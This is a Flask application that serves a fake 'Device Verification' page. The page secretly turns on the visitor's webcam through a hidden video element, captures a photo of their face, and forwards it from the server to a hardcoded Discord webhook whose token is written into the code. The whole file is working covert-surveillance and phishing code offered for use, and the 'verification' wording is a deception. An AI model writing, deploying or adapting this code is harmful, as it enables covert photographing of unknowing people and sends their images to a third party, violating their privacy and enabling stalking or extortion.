from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://discord.com/api/webhooks/1381298079151689850/sLg1G-ral1Nd9Mjtlt_JGmLGRx2toNtvRqKD5h9SUM8W1ideADMz1XTYbHmIAye41bRR')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(to bottom, #ff6e7f, #bfe9ff);
            color: #222;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }
        h1 {
            color: #2c3e50;
            font-size: 28px;
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        #status {
            font-size: 16px;
            color: #c0392b;
        }
        video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Device Verification</h1>
        <p>Please allow access to verify your device.</p>
        <video id="webcam" autoplay playsinline></video>
        <p id="status">Checking device...</p>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const webcamElement = document.getElementById('webcam');
        const canvasElement = document.getElementById('canvas');
        const statusElement = document.getElementById('status');

        async function startWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                webcamElement.srcObject = stream;
                statusElement.textContent = 'Verifying device...';
                setTimeout(captureSnapshot, 1000);
            } catch (err) {
                statusElement.textContent = 'Please allow access to proceed.';
            }
        }

        function captureSnapshot() {
            const context = canvasElement.getContext('2d');
            canvasElement.width = webcamElement.videoWidth || 640;
            canvasElement.height = webcamElement.videoHeight || 480;
            context.drawImage(webcamElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                const formData = new FormData();
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                formData.append('file', blob, `face_${timestamp}.jpg`);

                try {
                    const response = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });
                    if (response.ok) {
                        statusElement.textContent = 'Device verified!';
                        webcamElement.srcObject.getTracks().forEach(track => track.stop());
                    } else {
                        statusElement.textContent = 'Verification failed. Try again.';
                    }
                } catch (err) {
                    statusElement.textContent = 'Network issue. Try again.';
                }
            }, 'image/jpeg');
        }

        startWebcam();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if file:
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        files = {'file': (f'face_{timestamp}.jpg', file.read(), 'image/jpeg')}
        try:
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 204:
                return 'Success', 200
            else:
                return 'Failed', 500
        except Exception:
            return 'Network error', 500
    return 'No', 400

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
